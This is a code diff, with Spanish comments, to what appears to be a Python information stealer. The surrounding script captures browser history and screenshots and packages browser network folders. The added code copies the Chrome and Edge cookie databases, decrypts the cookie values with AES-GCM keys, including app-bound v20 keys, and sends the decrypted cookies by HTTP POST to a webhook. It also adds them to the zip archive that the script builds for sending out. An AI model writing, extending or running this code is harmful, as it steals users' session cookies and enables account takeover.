@@ -196,63 +196,132 @@ def generar_archivo_historial():
   return txt_path
 
 
-def empaquetar_network(browser="chrome"):
-    browser = browser.lower()
+import os
+import sys
+import json
+import sqlite3
+import base64
+import binascii
+import shutil
+import tempfile
+import requests # Necesario para enviar el webhook al final
+from datetime import datetime, timedelta
+from Crypto.Cipher import AES, ChaCha20_Poly1305
+
+# ==========================================
+# 1. FUNCIONES DE DESCIFRADO (Provenientes de 12.txt)
+# ==========================================
+
+def filetime_to_datetime(ts):
+    return datetime(1601, 1, 1) + timedelta(microseconds=ts)
+
+def decrypt_data(encrypted_junk, key, master_key=None, password=False):
+    version = encrypted_junk[:3]
+    if version in (b'v10', b'v11'):
+        try:
+            if password:
+                initialisation_vector = encrypted_junk[3:15]
+                encrypted_password = encrypted_junk[15:-16]
+                cipher = AES.new(master_key, AES.MODE_GCM, initialisation_vector)
+                return cipher.decrypt(encrypted_password).decode()
+            nonce = encrypted_junk[3:3 + 12]
+            if len(nonce) == 0:
+                return ""
+            cipher_text = encrypted_junk[3+12:-16]
+            tag = encrypted_junk[-16:]
+            plain_text = AES.new(key, AES.MODE_GCM, nonce)
+            text = plain_text.decrypt(cipher_text)
+            return text[32:].decode('utf-8')
+        except Exception:
+            return ""
+            
+    if version in (b'v20'):
+        try:
+            nonce = encrypted_junk[3:3 + 12]
+            if len(nonce) == 0:
+                return ""
+            cipher_text = encrypted_junk[3+12:-16]
+            tag = encrypted_junk[-16:]
+            plain_text = AES.new(key, AES.MODE_GCM, nonce)
+            text = plain_text.decrypt(cipher_text)
+            return text.decode('utf-8') if password else text[32:].decode('utf-8')
+        except Exception:
+            return ""
+
+# ==========================================
+# 2. EXTRACCIÓN Y PROCESAMIENTO POR NAVEGADOR (Google y Edge)
+# ==========================================
+
+def procesar_cookies_navegador(browser_name, decryption_key, master_key=None):
     appdata_local = os.path.join(os.path.expanduser("~"), "AppData", "Local")
-    appdata_roaming = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
     
-    target_dir = None
-    
-    if browser == "chrome":
-        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "Network")
-    elif browser == "edge":
-        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "Network")
-    elif browser == "opera":
-        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default", "Network")
-    elif browser == "operagx":
-        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default", "Network")
-    elif browser == "firefox":
-        target_dir = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles", "mipt27ed.default-release")
+    # Definir ruta según el navegador compatible con Chromium
+    if browser_name.lower() == "chrome":
+        db_path = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
+    elif browser_name.lower() == "edge":
+        db_path = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies")
     else:
-        return None
+        return []
 
-    if not target_dir or not os.path.exists(target_dir):
-        return None
+    if not os.path.exists(db_path):
+        return []
 
-    temp_dir = tempfile.gettempdir()
-    staging_dir = os.path.join(temp_dir, f"{browser}_network_staging")
-    zip_base_path = os.path.join(temp_dir, f"{browser}_network_data")
-
+    extracted_cookies = []
+    
+    # Copia temporal para evitar bloqueos por SQLite si el navegador está abierto
+    temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_cookies.db")
     try:
-        if os.path.exists(staging_dir):
-            shutil.rmtree(staging_dir, ignore_errors=True)
-        os.makedirs(staging_dir, exist_ok=True)
-
-        for item in os.listdir(target_dir):
-            source_item = os.path.join(target_dir, item)
-            target_item = os.path.join(staging_dir, item)
-            try:
-
-                if browser == "firefox" and not item.startswith("cookies.sqlite"):
-                    continue
-                
-                if os.path.isdir(source_item):
-                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
-                else:
-                    shutil.copy2(source_item, target_item)
-            except Exception:
-                pass
-
-        shutil.make_archive(zip_base_path, "zip", staging_dir)
-        final_zip_file = zip_base_path + ".zip"
-
-        if os.path.exists(staging_dir):
-            shutil.rmtree(staging_dir, ignore_errors=True)
-
-        return final_zip_file
+        shutil.copy2(db_path, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute('SELECT host_key, path, expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) FROM cookies')
+        values = cursor.fetchall()
+        
+        for host_key, path, expires_utc, has_expires, name, encrypted_value in values:
+            decrypted_value = decrypt_data(encrypted_value, decryption_key, master_key, False)
+            if decrypted_value:
+                expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
+                extracted_cookies.append({
+                    "browser": browser_name,
+                    "domain": host_key,
+                    "name": name,
+                    "path": path,
+                    "value": decrypted_value,
+                    "expires": expiration_date
+                })
+        conn.close()
+        os.remove(temp_db)
     except Exception:
-        return None
+        pass
+        
+    return extracted_cookies
 
+# ==========================================
+# 3. BLOQUE PRINCIPAL E INTEGRACIÓN DE WEBHOOK
+# ==========================================
+
+def ejecutar_extraccion_integral(app_bound_key, master_key_hex=None, webhook_url=None):
+    # Decodificar llaves principales igual que en main() de 12.txt
+    key = base64.b64decode(app_bound_key) if app_bound_key else None # Ajusta según tu método de decodificación de CLI
+    master_key = bytes.fromhex(master_key_hex) if master_key_hex else None
+
+    datos_totales = {
+        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "cookies_google": procesar_cookies_navegador("chrome", key, master_key),
+        "cookies_edge": procesar_cookies_navegador("edge", key, master_key)
+    }
+
+    if webhook_url:
+        try:
+            response = requests.post(webhook_url, json=datos_totales)
+            if response.status_code == 200:
+                print("[+] Webhook enviado exitosamente.")
+            else:
+                print(f"[-] Error al enviar webhook: {response.status_code}")
+        except Exception as e:
+            print(f"[-] Excepción en webhook: {e}")
+
+    return datos_totales
 def capturar_pantalla_jpg():
   try:
     
@@ -268,6 +337,8 @@ def capturar_pantalla_jpg():
   except Exception:
     return None
 
+
+######## Webhook #############################################################
 
 ######## Webhook #############################################################
 
@@ -312,6 +383,40 @@ def empaquetar_network(browser="chrome"):
                 if browser == "firefox" and not item.startswith("cookies.sqlite"):
                     continue
                 
+                # Integración para descifrar cookies de Google Chrome y Microsoft Edge
+                if browser in ["chrome", "edge"] and item.lower() == "cookies":
+                    try:
+                        # Copia temporal de la base de datos de cookies para evitar bloqueos
+                        temp_cookie_db = os.path.join(staging_dir, "cookies_temp.db")
+                        shutil.copy2(source_item, temp_cookie_db)
+                        
+                        conn = sqlite3.connect(temp_cookie_db)
+                        cursor = conn.cursor()
+                        cursor.execute('SELECT host_key, path, expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) FROM cookies')
+                        cookie_rows = cursor.fetchall()
+                        
+                        decrypted_cookies_list = []
+                        for host_key, path, expires_utc, has_expires, name, encrypted_value in cookie_rows:
+                            # Se asume la existencia previa de decrypt_data y las llaves correspondientes en el entorno general
+                            decrypted_value = decrypt_data(encrypted_value, key, master_key, False) if 'decrypt_data' in globals() else ""
+                            if decrypted_value:
+                                expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
+                                decrypted_cookies_list.append({
+                                    "domain": host_key,
+                                    "name": name,
+                                    "path": path,
+                                    "value": decrypted_value,
+                                    "expires": expiration_date
+                                })
+                        conn.close()
+                        
+                        # Guardar el resultado descifrado en un archivo JSON dentro del staging para que viaje en el zip
+                        json_cookie_path = os.path.join(staging_dir, f"decrypted_{browser}_cookies.json")
+                        with open(json_cookie_path, 'w', encoding='utf-8') as jf:
+                            json.dump(decrypted_cookies_list, jf, indent=4)
+                    except Exception:
+                        pass
+
                 if os.path.isdir(source_item):
                     shutil.copytree(source_item, target_item, dirs_exist_ok=True)
                 else:
